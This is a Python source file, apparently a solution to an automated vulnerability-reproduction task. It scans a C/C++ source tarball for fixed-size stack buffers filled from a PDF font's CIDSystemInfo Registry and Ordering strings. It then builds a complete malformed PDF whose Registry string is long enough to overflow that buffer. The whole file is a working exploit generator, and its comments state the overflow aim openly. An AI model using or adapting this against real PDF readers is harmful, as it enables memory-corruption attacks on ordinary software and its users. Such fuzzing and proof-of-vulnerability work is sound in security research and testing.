import io
import os
import re
import tarfile
from typing import Optional, List, Tuple


class Solution:
    def _detect_fallback_bufsize_from_text(self, text: str) -> Optional[int]:
        if "CIDSystemInfo" not in text:
            return None
        if "Registry" not in text or "Ordering" not in text:
            return None

        def find_char_array_size(var: str, near_pos: int) -> Optional[int]:
            start = max(0, near_pos - 12000)
            end = min(len(text), near_pos + 2000)
            window = text[start:end]
            # Prefer the closest preceding definition
            pat = re.compile(r'\bchar\s+' + re.escape(var) + r'\s*\[\s*(\d{1,7})\s*\]')
            matches = list(pat.finditer(window))
            if not matches:
                # Sometimes "unsigned char"
                pat2 = re.compile(r'\bunsigned\s+char\s+' + re.escape(var) + r'\s*\[\s*(\d{1,7})\s*\]')
                matches = list(pat2.finditer(window))
            if matches:
                m = matches[-1]
                try:
                    return int(m.group(1))
                except Exception:
                    return None
            return None

        candidates: List[int] = []

        # sprintf(target, "%s-%s", ...)
        for m in re.finditer(r'\bsprintf\s*\(\s*([A-Za-z_]\w*)\s*,\s*"(?:[^"\\]|\\.)*%s(?:[^"\\]|\\.)*-(?:[^"\\]|\\.)*%s', text):
            var = m.group(1)
            sz = find_char_array_size(var, m.start())
            if sz is not None:
                candidates.append(sz)

        # strcat(target, "-")
        for m in re.finditer(r'\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*"-"\s*\)', text):
            var = m.group(1)
            sz = find_char_array_size(var, m.start())
            if sz is not None:
                candidates.append(sz)

        # strcpy(target, registry) and later strcat(target, ordering)
        for m in re.finditer(r'\bstrcpy\s*\(\s*([A-Za-z_]\w*)\s*,', text):
            var = m.group(1)
            # Only consider if near Registry/Ordering usage
            near = text[max(0, m.start() - 4000): min(len(text), m.start() + 4000)]
            if "Registry" in near and "Ordering" in near and ("strcat" in near or "sprintf" in near):
                sz = find_char_array_size(var, m.start())
                if sz is not None:
                    candidates.append(sz)

        # If there are multiple, choose a plausible smallest-but-not-tiny
        candidates = [c for c in candidates if 8 <= c <= 1_000_000]
        if not candidates:
            return None
        # Choose minimum; overflow easiest
        return min(candidates)

    def _detect_fallback_bufsize(self, src_path: str) -> Optional[int]:
        try:
            tf = tarfile.open(src_path, mode="r:*")
        except Exception:
            return None

        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".m", ".mm")
        best: Optional[int] = None
        try:
            for member in tf:
                if not member.isfile():
                    continue
                name = member.name.lower()
                if not name.endswith(exts):
                    continue
                if member.size <= 0 or member.size > 2_000_000:
                    continue
                f = tf.extractfile(member)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                if b"CIDSystemInfo" not in data:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    text = data.decode("latin1", errors="ignore")

                sz = self._detect_fallback_bufsize_from_text(text)
                if sz is not None:
                    if best is None or sz < best:
                        best = sz
                        if best <= 256:
                            break
        finally:
            try:
                tf.close()
            except Exception:
                pass
        return best

    def _build_pdf(self, registry_len: int, ordering: str = "O") -> bytes:
        registry = "A" * registry_len
        ordering_s = ordering

        header = b"%PDF-1.4\n%\xD0\xD4\xC5\xD8\n"

        def obj(n: int, body: bytes) -> Tuple[int, bytes]:
            return n, (str(n).encode("ascii") + b" 0 obj\n" + body + b"\nendobj\n")

        objects: List[Tuple[int, bytes]] = []

        # 1: Catalog
        objects.append(obj(1, b"<< /Type /Catalog /Pages 2 0 R >>"))

        # 2: Pages
        objects.append(obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))

        # 3: Page
        objects.append(obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
                              b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"))

        # 4: Type0 font
        objects.append(obj(4, b"<< /Type /Font /Subtype /Type0 /BaseFont /AAAA "
                              b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>"))

        # 5: Contents stream
        content = b"BT /F1 12 Tf 10 10 Td <0000> Tj ET\n"
        stream = b"<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" + content + b"endstream"
        objects.append(obj(5, stream))

        # 7: FontDescriptor (no embedded font file => triggers fallback/substitution paths)
        fd = (b"<< /Type /FontDescriptor /FontName /AAAA /Flags 4 "
              b"/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 "
              b"/CapHeight 700 /StemV 80 >>")
        objects.append(obj(7, fd))

        # 6: CIDFontType2 with CIDSystemInfo containing long Registry/Ordering
        cid = (b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /AAAA "
               b"/CIDSystemInfo << /Registry (" + registry.encode("ascii") +
               b") /Ordering (" + ordering_s.encode("ascii") + b") /Supplement 0 >> "
               b"/FontDescriptor 7 0 R /DW 1000 /CIDToGIDMap /Identity >>")
        objects.append(obj(6, cid))

        max_obj = max(n for n, _ in objects)
        objects.sort(key=lambda x: x[0])

        out = bytearray()
        out += header
        offsets = [0] * (max_obj + 1)

        for n, data in objects:
            offsets[n] = len(out)
            out += data

        xref_off = len(out)
        out += b"xref\n"
        out += b"0 " + str(max_obj + 1).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, max_obj + 1):
            off = offsets[i]
            out += f"{off:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size " + str(max_obj + 1).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_off).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        bufsize = self._detect_fallback_bufsize(src_path)
        if bufsize is None:
            # Safe default: likely to overflow any small stack buffer used for "<Registry>-<Ordering>"
            reg_len = 20000
        else:
            # Ensure overflow beyond the stack buffer
            reg_len = bufsize + 256
            if reg_len < 1024:
                reg_len = 1024

        return self._build_pdf(registry_len=reg_len, ordering="O")